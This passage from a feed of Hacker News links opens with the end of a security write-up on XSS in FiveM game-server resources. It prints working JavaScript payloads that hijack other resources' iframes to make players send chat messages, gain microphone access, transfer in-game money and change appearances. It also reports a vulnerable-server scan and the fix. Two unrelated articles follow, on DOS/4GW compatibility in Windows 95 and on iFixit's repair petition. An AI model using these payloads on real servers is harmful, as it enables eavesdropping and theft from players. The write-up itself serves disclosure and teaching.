<pre><code><span>client<span>-&gt;</span><span>AddProcessMessageHandler</span><span>(</span><span>"invokeNative"</span><span>,</span> <span>[</span><span>]</span> <span>(</span>CefRefPtr<span>&lt;</span>CefBrowser<span>&gt;</span> browser<span>,</span> CefRefPtr<span>&lt;</span>CefProcessMessage<span>&gt;</span> message<span>)</span>
</span><span>  <span>{</span>
</span><span>    <span>auto</span> args <span>=</span> message<span>-&gt;</span><span>GetArgumentList</span><span>(</span><span>)</span><span>;</span>
</span><span>    <span>auto</span> nativeType <span>=</span> args<span>-&gt;</span><span>GetString</span><span>(</span><span>0</span><span>)</span><span>;</span>
</span><span>
</span><span>    nui<span>::</span><span>OnInvokeNative</span><span>(</span>nativeType<span>.</span><span>c_str</span><span>(</span><span>)</span><span>,</span> <span>ToWide</span><span>(</span>args<span>-&gt;</span><span>GetString</span><span>(</span><span>1</span><span>)</span><span>.</span><span>ToString</span><span>(</span><span>)</span><span>)</span><span>.</span><span>c_str</span><span>(</span><span>)</span><span>)</span><span>;</span>
</span><span>
</span><span>    <span>if</span> <span>(</span>nativeType <span>==</span> <span>"quit"</span><span>)</span>
</span><span>    <span>{</span>
</span><span>      <span>// TODO: CEF shutdown and native stuff related to it (set a shutdown flag)</span>
</span><span>      <span>ExitProcess</span><span>(</span><span>0</span><span>)</span><span>;</span>
</span><span>    <span>}</span>
</span><span>    <span>else</span> <span>if</span> <span>(</span>nativeType <span>==</span> <span>"openUrl"</span><span>)</span>
</span><span>    <span>{</span>
</span><span>      std<span>::</span>string arg <span>=</span> args<span>-&gt;</span><span>GetString</span><span>(</span><span>1</span><span>)</span><span>.</span><span>ToString</span><span>(</span><span>)</span><span>;</span>
</span><span>
</span><span>      <span>if</span> <span>(</span>arg<span>.</span><span>find</span><span>(</span><span>"http://"</span><span>)</span> <span>==</span> <span>0</span> <span>||</span> arg<span>.</span><span>find</span><span>(</span><span>"https://"</span><span>)</span> <span>==</span> <span>0</span><span>)</span>
</span><span>      <span>{</span>
</span><span>        <span>ShellExecute</span><span>(</span><span>nullptr</span><span>,</span> L<span>"open"</span><span>,</span> <span>ToWide</span><span>(</span>arg<span>)</span><span>.</span><span>c_str</span><span>(</span><span>)</span><span>,</span> <span>nullptr</span><span>,</span> <span>nullptr</span><span>,</span> SW_SHOWNORMAL<span>)</span><span>;</span>
</span><span>      <span>}</span>
</span><span>    <span>}</span>
</span><span>    <span>else</span> <span>if</span> <span>(</span>nativeType <span>==</span> <span>"setConvar"</span> <span>||</span> nativeType <span>==</span> <span>"setArchivedConvar"</span><span>)</span>
</span><span>    <span>{</span>
</span><span>      <span>if</span> <span>(</span>nui<span>::</span><span>HasMainUI</span><span>(</span><span>)</span><span>)</span>
</span><span>      <span>{</span>
</span><span>        <span>// code to set convars, however this only works in the main menu.</span>
</span><span>      <span>}</span>
</span><span>    <span>}</span>
</span><span>    <span>else</span> <span>if</span> <span>(</span>nativeType <span>==</span> <span>"getConvars"</span><span>)</span>
</span><span>    <span>{</span>
</span><span>      <span>if</span> <span>(</span>nui<span>::</span><span>HasMainUI</span><span>(</span><span>)</span><span>)</span>
</span><span>      <span>{</span>
</span><span>        <span>// code to get convars, however this only works in the main menu.</span>
</span><span>      <span>}</span>
</span><span>    <span>}</span>
</span><span>    <span>return</span> <span>true</span><span>;</span>
</span><span><span>}</span><span>)</span><span>;</span>
</span></code></pre>
<ul>
<li><code>openUrl</code>: Self explanatory, opens a URL by running <code>ShellExecute</code> with the <code>open</code> parameter.
Thankfully, the argument is checked to ensure it's a URL before executing the command to prevent
arbitrary command execution.</li>
<li><code>quit</code>: Also self explanatory, shutdown the game.</li>
</ul>
<p>Other functions existing on the <code>window</code> object include bangers such as:</p>
<ul>
<li><code>window.fxdkClipboardRead</code>: Read the user's clipboard, completely bypassing the Chromium permissions
model.</li>
</ul>
<pre><code><span>nuiApp<span>-&gt;</span><span>AddV8Handler</span><span>(</span><span>"fxdkClipboardRead"</span><span>,</span> <span>[</span><span>]</span><span>(</span><span>const</span> CefV8ValueList<span>&amp;</span> arguments<span>,</span> CefString<span>&amp;</span> exception<span>)</span>
</span><span>	<span>{</span>
</span><span>		<span>if</span> <span>(</span><span>OpenClipboard</span><span>(</span><span>nullptr</span><span>)</span><span>)</span>
</span><span>		<span>{</span>
</span><span>			ClipboardCloser closer<span>;</span>
</span><span>
</span><span>			<span>if</span> <span>(</span>HANDLE ptr <span>=</span> <span>GetClipboardData</span><span>(</span>CF_UNICODETEXT<span>)</span><span>)</span>
</span><span>			<span>{</span>
</span><span>				<span>if</span> <span>(</span><span>wchar_t</span><span>*</span> text <span>=</span> <span><span>static_cast</span><span><span>&lt;</span><span>wchar_t</span><span>*</span><span>&gt;</span></span></span><span>(</span><span>GlobalLock</span><span>(</span>ptr<span>)</span><span>)</span><span>)</span>
</span><span>				<span>{</span>
</span><span>					std<span>::</span>wstring <span>textString</span><span>(</span>text<span>)</span><span>;</span>
</span><span>
</span><span>					<span>GlobalUnlock</span><span>(</span>ptr<span>)</span><span>;</span>
</span><span>
</span><span>					<span>return</span> <span>CefV8Value</span><span>::</span><span>CreateString</span><span>(</span>textString<span>)</span><span>;</span>
</span><span>				<span>}</span>
</span><span>			<span>}</span>
</span><span>		<span>}</span>
</span><span>		<span>return</span> <span>CefV8Value</span><span>::</span><span>CreateString</span><span>(</span><span>""</span><span>)</span><span>;</span>
</span><span>	<span>}</span><span>)</span><span>;</span>
</span></code></pre>
<ul>
<li><code>window.fxdkClipboardWrite</code>: Write to the user's clipboard.</li>
</ul>
<p>As of May 27 2023, the clipboard functions are no longer accessible. Presumably due
to misuse by malicious server admins &amp; resource developers.</p>
<h2>The DOM</h2>
<p>Since the exploit lives in the DOM with isolation disabled, we're also able to hijack other resource's iframes.</p>
<h3>Make users send chat messages</h3>
<p>A peek into <code>chat/html/App.js</code> tells us how in-game messages are handled:</p>
<pre><code><span><span>// window.post defined in chat/html/index.html</span>
</span><span><span>window</span><span>.</span><span>post</span> <span>=</span> <span>(</span><span>url<span>,</span> data</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>  <span>var</span> request <span>=</span> <span>new</span> <span>XMLHttpRequest</span><span>(</span><span>)</span><span>;</span>
</span><span>  request<span>.</span><span>open</span><span>(</span><span>'POST'</span><span>,</span> url<span>,</span> <span>true</span><span>)</span><span>;</span>
</span><span>  request<span>.</span><span>setRequestHeader</span><span>(</span><span>'Content-Type'</span><span>,</span> <span>'application/json; charset=UTF-8'</span><span>)</span><span>;</span>
</span><span>  request<span>.</span><span>send</span><span>(</span>data<span>)</span><span>;</span>
</span><span><span>}</span>
</span><span>
</span><span><span>send</span><span>(</span><span>e</span><span>)</span> <span>{</span>
</span><span>  <span>if</span><span>(</span><span>this</span><span>.</span><span>message</span> <span>!==</span> <span>''</span><span>)</span> <span>{</span>
</span><span>    <span>post</span><span>(</span><span>'http://chat/chatResult'</span><span>,</span> <span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>{</span>
</span><span>      <span>message</span><span>:</span> <span>this</span><span>.</span><span>message</span><span>,</span>
</span><span>    <span>}</span><span>)</span><span>)</span><span>;</span>
</span><span>  <span>}</span> <span>else</span> <span>{</span>
</span><span>    <span>this</span><span>.</span><span>hideInput</span><span>(</span><span>true</span><span>)</span><span>;</span>
</span><span>  <span>}</span>
</span><span><span>}</span>
</span></code></pre>
<p>Nice, an attacker should be able to have users send chat messages by sending
a request to this URL with the <code>message</code> payload being our chat message:</p>
<pre><code><span><span>fetch</span><span>(</span><span>"https://chat/chatResult"</span><span>,</span> <span>{</span>
</span><span>    <span>method</span><span>:</span> <span>"POST"</span><span>,</span>
</span><span>    <span>body</span><span>:</span> <span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>{</span> <span>message</span><span>:</span> <span>"test"</span> <span>}</span><span>)</span><span>,</span>
</span><span><span>}</span><span>)</span><span>;</span>
</span></code></pre>
<figure><img alt="Result of the payload from above" sizes="100vw" srcset="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=640&amp;q=75 640w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=750&amp;q=75 750w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=828&amp;q=75 828w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=1080&amp;q=75 1080w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=1200&amp;q=75 1200w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=1920&amp;q=75 1920w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=2048&amp;q=75 2048w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=3840&amp;q=75 3840w" src="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fchat-payload.png&amp;w=3840&amp;q=75" width="100" height="100" decoding="async" data-nimg="1" loading="lazy"><figcaption>Result of the payload from above</figcaption></figure>
<p>An attacker can also execute in-game commands (Make admins execute <code>/ban</code>, <code>/kick</code>, etc...).</p>
<h3>Abusing Web APIs</h3>
<p>The attacker can also utilize various Web APIs to do things like access the user's microphone:
However, FiveM prompts the user for microphone access which may look suspicious.</p>
<pre><code><span><span>function</span> <span>getLocalStream</span><span>(</span><span>)</span> <span>{</span>
</span><span>  <span>navigator</span><span>.</span><span>mediaDevices</span>
</span><span>    <span>.</span><span>getUserMedia</span><span>(</span><span>{</span> <span>video</span><span>:</span> <span>false</span><span>,</span> <span>audio</span><span>:</span> <span>true</span> <span>}</span><span>)</span>
</span><span>    <span>.</span><span>then</span><span>(</span><span>(</span><span>stream</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>      <span>window</span><span>.</span><span>localStream</span> <span>=</span> stream<span>;</span> <span>// A</span>
</span><span>      <span>window</span><span>.</span><span>localAudio</span><span>.</span><span>srcObject</span> <span>=</span> stream<span>;</span> <span>// B</span>
</span><span>      <span>window</span><span>.</span><span>localAudio</span><span>.</span><span>autoplay</span> <span>=</span> <span>true</span><span>;</span> <span>// C</span>
</span><span>    <span>}</span><span>)</span>
</span><span>    <span>.</span><span>catch</span><span>(</span><span>(</span><span>err</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>      <span>console</span><span>.</span><span>error</span><span>(</span><span><span>`</span><span>you got an error: </span><span><span>${</span>err<span>}</span></span><span>`</span></span><span>)</span><span>;</span>
</span><span>    <span>}</span><span>)</span><span>;</span>
</span><span><span>}</span>
</span></code></pre>
<figure><img alt="Infected resource rcore_radiocar asking for media device permission. Very suspicious" sizes="100vw" srcset="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=640&amp;q=75 640w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=750&amp;q=75 750w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=828&amp;q=75 828w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=1080&amp;q=75 1080w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=1200&amp;q=75 1200w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=1920&amp;q=75 1920w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=2048&amp;q=75 2048w, https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=3840&amp;q=75 3840w" src="https://www.nullpt.rs/_next/image?url=%2Fposts%2Fhacking-gta-servers-using-web-exploitation-techniques%2Fmedia-permission.png&amp;w=3840&amp;q=75" width="100" height="100" decoding="async" data-nimg="1" loading="lazy"><figcaption>Infected resource rcore_radiocar asking for media device permission. Very suspicious</figcaption></figure>
<p>So instead, we can hijack an iframe that may already have microphone permission.
A good candidate being <code>gksphone</code>, a resource that gives the players a cellphone
and the ability to call each other.</p>
<pre><code><span><span>window</span><span>.</span><span>gksPhone</span> <span>=</span> top<span>.</span><span>citFrames</span><span>[</span><span>'gksphone'</span><span>]</span><span>;</span>
</span><span>
</span><span><span>window</span><span>.</span><span>reqMicrophoneScript</span> <span>=</span> top<span>.</span><span>document</span><span>.</span><span>createElement</span><span>(</span><span>'script'</span><span>)</span><span>;</span>
</span><span><span>window</span><span>.</span><span>reqMicrophoneScript</span><span>.</span><span>innerHTML</span> <span>=</span> <span><span>`</span><span>
</span></span></span><span><span><span>function requestMicrophone() {
</span></span></span><span><span><span>    return navigator.mediaDevices.getUserMedia({ audio: true })
</span></span></span><span><span><span>    .then((stream) =&gt; {
</span></span></span><span><span><span>      // ...
</span></span></span><span><span><span>    })
</span></span></span><span><span><span>}
</span></span></span><span><span><span>requestMicrophone();
</span></span></span><span><span><span></span><span>`</span></span>
</span><span>
</span><span><span>// inject the function into the gksphone resource</span>
</span><span><span>// which already has microphone access :)</span>
</span><span><span>window</span><span>.</span><span>gksPhone</span><span>.</span><span>contentWindow</span><span>.</span><span>document</span><span>.</span><span>body</span><span>.</span><span>appendChild</span><span>(</span><span>window</span><span>.</span><span>reqMicrophoneScript</span><span>)</span><span>;</span>
</span></code></pre>
<h3>Stealing Player's Money</h3>
<p>An attacker is able to transfer all player's money to themselves (or to any specified ID)
by abusing the <code>bank</code> resource.</p>
<pre><code><span><span>// bank/html/script.js</span>
</span><span>$<span>.</span><span>post</span><span>(</span><span>'http://bank/transfer'</span><span>,</span> <span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>{</span>
</span><span>    <span>to</span><span>:</span> <span>$</span><span>(</span><span>'#idval'</span><span>)</span><span>.</span><span>val</span><span>(</span><span>)</span><span>,</span>
</span><span>    <span>amountt</span><span>:</span> <span>$</span><span>(</span><span>'#transferval'</span><span>)</span><span>.</span><span>val</span><span>(</span><span>)</span>
</span><span><span>}</span><span>)</span><span>)</span><span>;</span>
</span></code></pre>
<h3>Changing Everyone's Appearence</h3>
<pre><code><span><span>const</span> fivemAppearanceFrame <span>=</span> top<span>.</span><span>window</span><span>.</span><span>citFrames</span><span>[</span><span>"fivem-appearance"</span><span>]</span><span>.</span><span>contentWindow</span><span>;</span>
</span><span><span>const</span> fetch <span>=</span> fivemAppearanceFrame<span>.</span><span>fetch</span><span>;</span>
</span><span>
</span><span><span>const</span> baseUrl <span>=</span> <span><span>`</span><span>https://fivem-appearance</span><span>`</span></span><span>;</span>
</span><span>
</span><span><span>function</span> <span>randomInteger</span><span>(</span><span>min<span>,</span> max</span><span>)</span> <span>{</span>
</span><span>  <span>return</span> <span>Math</span><span>.</span><span>floor</span><span>(</span><span>Math</span><span>.</span><span>random</span><span>(</span><span>)</span> <span>*</span> <span>(</span>max <span>-</span> min <span>+</span> <span>1</span><span>)</span><span>)</span> <span>+</span> min<span>;</span>
</span><span><span>}</span>
</span><span>
</span><span><span>const</span> <span>main</span> <span>=</span> <span>async</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>  <span>// Get the player's existing appearence</span>
</span><span>  <span>const</span> response <span>=</span> <span>await</span> <span>fetch</span><span>(</span>baseUrl <span>+</span> <span>"/appearance_get_settings_and_data"</span><span>,</span> <span>{</span>
</span><span>    <span>method</span><span>:</span> <span>"GET"</span><span>,</span>
</span><span>    <span>headers</span><span>:</span> <span>{</span>
</span><span>      <span>"Content-type"</span><span>:</span> <span>"application/json; charset=UTF-8"</span><span>,</span>
</span><span>    <span>}</span><span>,</span>
</span><span>  <span>}</span><span>)</span><span>;</span>
</span><span>  <span>const</span> body <span>=</span> <span>await</span> response<span>.</span><span>json</span><span>(</span><span>)</span><span>;</span>
</span><span>
</span><span>  <span>if</span> <span>(</span>body <span>&amp;&amp;</span> <span>"appearanceSettings"</span> <span>in</span> body<span>)</span> <span>{</span>
</span><span>    <span>const</span> <span>{</span> components <span>}</span> <span>=</span> body<span>.</span><span>appearanceSettings</span><span>;</span>
</span><span>    components<span>.</span><span>forEach</span><span>(</span><span>(</span><span>component</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>      <span>const</span> componentId <span>=</span> component<span>.</span><span>component_id</span><span>;</span>
</span><span>      <span>const</span> drawableId <span>=</span> <span>randomInteger</span><span>(</span>
</span><span>        component<span>.</span><span>drawable</span><span>.</span><span>min</span><span>,</span>
</span><span>        component<span>.</span><span>drawable</span><span>.</span><span>max</span>
</span><span>      <span>)</span><span>;</span>
</span><span>      <span>const</span> textureId <span>=</span> <span>randomInteger</span><span>(</span>
</span><span>        component<span>.</span><span>texture</span><span>.</span><span>min</span><span>,</span>
</span><span>        component<span>.</span><span>texture</span><span>.</span><span>max</span>
</span><span>      <span>)</span><span>;</span>
</span><span>
</span><span>      <span>// Change the appearence to random clothing </span>
</span><span>      <span>fetch</span><span>(</span>baseUrl <span>+</span> <span>"/appearance_change_component"</span><span>,</span> <span>{</span>
</span><span>        <span>method</span><span>:</span> <span>"POST"</span><span>,</span>
</span><span>        <span>headers</span><span>:</span> <span>{</span>
</span><span>          <span>"Content-type"</span><span>:</span> <span>"application/json; charset=UTF-8"</span><span>,</span>
</span><span>        <span>}</span><span>,</span>
</span><span>        <span>body</span><span>:</span> <span>{</span>
</span><span>          <span>component_id</span><span>:</span> componentId<span>,</span>
</span><span>          <span>drawable</span><span>:</span> drawableId<span>,</span>
</span><span>          <span>texture</span><span>:</span> textureId<span>,</span>
</span><span>        <span>}</span><span>,</span>
</span><span>      <span>}</span><span>)</span><span>;</span>
</span><span>    <span>}</span><span>)</span><span>;</span>
</span><span>  <span>}</span>
</span><span><span>}</span><span>;</span>
</span><span>
</span><span><span>main</span><span>(</span><span>)</span><span>;</span>
</span></code></pre>
<h2>Impact</h2>
<p>A quick script Pimothy and I wrote to parse the FiveM server list and filter by resources
shows that hundreds of servers contained the vulnerable resources with the potential
to infect thousands of players:</p>
<pre><code><span>xsound found on w9a... players: [628/2048]
</span><span>rcore_radiocar found on 8bo... players: [256/500]
</span><span>xsound found on 35a... players: [299/400]
</span><span>xsound found on a6r... players: [314/2048]
</span><span>rcore_radiocar found on a6r... players: [314/2048]
</span><span>xsound found on gq6... players: [313/2048]
</span><span>xsound found on 4ez... players: [198/500]
</span><span>xsound found on pkp... players: [570/1069]
</span><span>xsound found on npx... players: [347/2048]
</span><span>xsound found on 8qq... players: [252/800]
</span><span>rcore_radiocar found on qrv... players: [137/200]
</span><span>xsound found on qrv... players: [137/200]
</span><span>xsound found on mko... players: [90/333]
</span><span>xsound found on mpd... players: [160/600]
</span><span>xsound found on aqq... players: [137/1337]
</span><span>xsound found on 23o... players: [135/2048]
</span><span>xsound found on gro... players: [120/150]
</span><span>xsound found on l54... players: [224/512]
</span><span>rcore_radiocar found on j8d... players: [182/400]
</span><span>xsound found on e3r... players: [122/175]
</span><span>xsound found on eaz... players: [160/500]
</span><span>xsound found on rk6... players: [60/300]
</span><span>and many more...
</span></code></pre>
<p>As shown above, the severity of this exploit is fairly high as an attacker is able
to execute arbitrary JavaScript to all players on a server allowing for things such
as microphone access, clipboard contents, and more. It was clear I needed to report
it to the resource developer and so I did and <a href="https://github.com/Xogy/xsound/blame/8790f60a32506273ef09d7d963b36299bb621e54/html/scripts/SoundPlayer.js#L71">on May 18 2022, a patch was released
to fix the XSS.</a></p>
<pre><code><span><span>setSoundUrl</span><span>(</span><span>result</span><span>)</span> <span>{</span>
</span><span>	<span>this</span><span>.</span><span>url</span> <span>=</span> result<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>&lt;<span><span>[</span><span>^</span>&gt;<span>]</span></span><span>*</span>&gt;<span>?</span></span><span>/</span><span>gm</span></span><span>,</span> <span>''</span><span>)</span><span>;</span>
</span><span><span>}</span>
</span></code></pre>
<p>I had an idea to find servers that may still be vulnerable to this exploit so I could report it
to the server owners. It would work by traversing the server list and requesting their xsound resource
to test if the patch was applied (likely using a regex). However, the FiveM server encrypts resources and
decrypts them on the client. The decrypt routine is heavily obfuscated by their anticheat <code>adhesive.dll</code>
making automation infeasible.</p>
<h2>Conclusion</h2>
<p>FiveM provides a powerful framework to create game experiences not otherwise possible
in Grand Theft Auto. However, this power can be abused by attackers through the use of
XSS in vulnerable NUI resources. It is important to utilize proper input sanitization
and other best practices to prevent exploits like this. Server owners should also keep
installed resources up to date.</p>
<h2>Special Thanks</h2>
<ul>
<li><a href="https://github.com/pimothyxd">pimothy</a> - Helped with the research for this project. Created the server list aggregator to scan for vulnerable servers.</li>
<li><a href="https://jord.in/">jordin</a> - A test subject to help test the more severe payloads (Bank transfers, Microphone access, etc...)</li>
</ul>
<section data-footnotes="true">
<ol>
<li id="user-content-fn-earnings">
<p><a href="https://www.ign.com/articles/take-two-ceo-says-mid-generation-upgrades-like-rumored-ps5-pro-arent-all-that-meaningful">https://www.ign.com/articles/take-two-ceo-says-mid-generation-upgrades-like-rumored-ps5-pro-arent-all-that-meaningful</a> <a href="#user-content-fnref-earnings" data-footnote-backref="true" aria-label="Back to content">↩</a></p>
</li>
<li id="user-content-fn-cfx-acquired">
<p><a href="https://www.rockstargames.com/newswire/article/8971o8789584a4/roleplay-community-update">Cfx.re has been acquired by Rockstar Games</a> <a href="#user-content-fnref-cfx-acquired" data-footnote-backref="true" aria-label="Back to content">↩</a></p>
</li>
</ol>
</section></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[DOS/4GW made Windows 95 game compatibility easier, but with higher stakes (222 pts)]]></title>
            <link>https://devblogs.microsoft.com/oldnewthing/20230829-00/?p=108661</link>
            <guid>37311508</guid>
            <pubDate>Tue, 29 Aug 2023 17:57:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://devblogs.microsoft.com/oldnewthing/20230829-00/?p=108661">https://devblogs.microsoft.com/oldnewthing/20230829-00/?p=108661</a>, See on <a href="https://news.ycombinator.com/item?id=37311508">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="featured">
                         <p>
            August 29th, 2023</p><!-- .entry-meta -->
        <p>By far, <a title="DOS/4GW and Protected Mode" href="https://pikuma.com/blog/what-is-dos4gw-protected-mode"> the most popular so-called DOS Extender in the early 1990’s was DOS/4GW</a>. MS-DOS game compatibility occupied a very large portion of my time during Windows 95 development, so I saw a lot of DOS Extender banners, most frequently the DOS/4GW banner.</p>
<p>Now, you might wonder, “How did these games even run in Windows 95 if they came with a DOS Extender? Wouldn’t the extender try to enter protected mode and fail, because Windows was already managing protected mode?”</p>
<p>The trick is that these extenders were really two programs bundled together. One was a protected mode server, and the other was a protected mode client library.</p>
<p>In the beginning, there was the Virtual Control Program Interface (VCPI), which was supported by expanded memory managers like EMM386. These expanded memory managers barely used protected mode at all: The only thing they cared about was getting access to memory above the 1MB boundary, so they set up some page tables in order to map extended memory into the expanded memory page frame, but did no other virtualization. MS-DOS ran in a virtual machine that had full hardware access, and the VCPI interface let an MS-DOS application say, “Hey, I’d like to take over complete control of the system now,” and VCPI would say “Sure, no problem!”</p>
<p>The VCPI interface quickly faded in popularity because no protected mode operating system (like Windows 3.0 in enhanced mode) would let any program take over complete control of the system. You would basically be suspending the old operating system in order to let the MS-DOS program take over as its own new custom operating system. Windows 3.0 introduced a new interface called the DOS Protected Mode Interface (DPMI) which let MS-DOS programs request that their code execute in protected mode, but only in user mode. The DPMI provider remained in control of kernel mode.</p>
<p>Okay, so back to DOS/4GW. When it started up, the DOS/4GW extender looked around to see if a DPMI server was already running. If not, then it installed itself as the DPMI server. But if a DPMI server was already running, then it allowed that DPMI server to remain in charge.</p>
<p>The game communicated only with the DPMI client portion of the library, which it used to transition to 32-bit mode, allocate memory, and do all those 32-bit things that these 32-bit game wanted to 32-bit do.</p>
<p>In other words, we have the following block diagram:</p>
<table title="The game code runs in ring 3 and communicates with the DPMI client (the DOS/4GW DPMI client) also in ring 3. The DPMI client communicates with a DPMI server. If running inside Windows, the DPMI server is Window sitself. If running standalone, then the DPMI server is the DOS/4GW DPMI server.">
<tbody>
<tr>
<td>&nbsp;</td>
<td>Inside Windows</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Standalone</td>
</tr>
<tr>
<td>DPMI server<br>
(ring 0)</td>
<td>Windows</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>DOS/4GW<br>
DPMI Server</td>
</tr>
<tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>⤡</td>
<td>&nbsp;</td>
<td>⤢</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>DPMI client<br>
(ring 3)</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>DOS/4GW<br>
DPMI Client</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>⇅</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Game code<br>
(ring 3)</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Game</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<p>Both Windows and the DOS/4GW DPMI server implement the DPMI interface, so the DOS/4GW DPMI client used standard DPMI calls to communicate with both servers.</p>
<p>This was great for application compatibility, because if there was some issue with how the DOS/4GW client communicated with the DOS/4GW server, we just had to fix it once, and it fixed a lot of games. On the other hand, if the issue couldn’t be fixed, it broke a lot of games.</p>
<p>High risk, high reward.</p>
<p>Miraculously, most games <i>just worked</i> despite running under a different DPMI server from what they were originally developed with. There were occasional issues with specific games. Popular ones include <a title="Getting MS-DOS games to run on Windows 95: Virtual memory" href="https://devblogs.microsoft.com/oldnewthing/20160328-00/?p=93204"> games which assumed that all memory was physical</a> and <a title="Getting MS-DOS games to run on Windows 95: The interrupt flag" href="https://devblogs.microsoft.com/oldnewthing/20160404-00/?p=93261"> games which assumed the interrupt flag was unvirtualized</a>, but for the most part, things worked well enough that the remaining issues could be treated as app-specific bugs.</p>

        

		
        
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[iFixit Petitions Government for Right to Hack McDonald's Ice Cream Machine (293 pts)]]></title>
            <link>https://www.404media.co/activists-petition-government-for-right-to-hack-mcdonalds-mcflurry-machines-to-repair-them/</link>
            <guid>37311239</guid>
            <pubDate>Tue, 29 Aug 2023 17:37:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.404media.co/activists-petition-government-for-right-to-hack-mcdonalds-mcflurry-machines-to-repair-them/">https://www.404media.co/activists-petition-government-for-right-to-hack-mcdonalds-mcflurry-machines-to-repair-them/</a>, See on <a href="https://news.ycombinator.com/item?id=37311239">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <article>
          <div>
              <!--kg-card-begin: html--><!--kg-card-end: html--><p>A group of right to repair activists and consumer rights advocates are petitioning the Librarian of Congress for the right to hack McDonald’s <a href="https://www.vice.com/en/article/4adyng/a-bot-tracking-mcdonalds-ice-cream-machines-finds-troubling-racial-disparities?ref=404media.co">notoriously unreliable</a> McFlurry machines for the purposes of repair, according to a copy of the petition obtained by 404 Media.</p><p>“This is a request to expand the repair exemption for consumer electronic devices to include commercial industrial equipment such as automated building management systems and industrial equipment (i.e. soft serve ice cream machines and other industrial kitchen equipment),” the proposal, written by right to repair group iFixit and the nonprofit Public Knowledge, says.</p><p>In addition, <a href="https://www.ifixit.com/News/80215/whats-inside-that-mcdonalds-ice-cream-machine-broken-copyright-law?ref=404media.co">iFixit got its hands on a Taylor ice cream machine</a> and tore it down in an effort to determine why they are broken so damn often and published a new video showing the process of taking the machine apart and explaining why they’re always broken when you want fast food ice cream. </p><p>The petition and teardown video come as a lawsuit between Taylor and a company that made a device that reads and deciphers the machine’s error codes enters its third year and heads toward a jury trial later this fall. </p><p>Every three years, interested parties have to file requests with the Librarian of Congress that seek “exemptions” to the Digital Millennium Copyright Act, the overarching federal copyright law. Through a process called Section 1201 rulemaking, repair professionals and consumer rights groups seek permission from the government to break arbitrary software locks and passwords that keep consumers and repair professionals from diagnosing and repairing equipment they own or are authorized by the owner to work on. </p><figure><img src="https://www.404media.co/content/images/2023/08/Screenshot-2023-08-28-at-1.20.28-PM.png" alt="" loading="lazy" width="2000" height="872" srcset="https://www.404media.co/content/images/size/w600/2023/08/Screenshot-2023-08-28-at-1.20.28-PM.png 600w, https://www.404media.co/content/images/size/w1000/2023/08/Screenshot-2023-08-28-at-1.20.28-PM.png 1000w, https://www.404media.co/content/images/size/w1600/2023/08/Screenshot-2023-08-28-at-1.20.28-PM.png 1600w, https://www.404media.co/content/images/size/w2400/2023/08/Screenshot-2023-08-28-at-1.20.28-PM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Image: iFixit</figcaption></figure><p>Currently, Taylor has service contracts with McDonald’s franchises that allow them to exclusively service the ice cream machines. A DMCA exemption would allow McDonald’s franchises to legally do repair 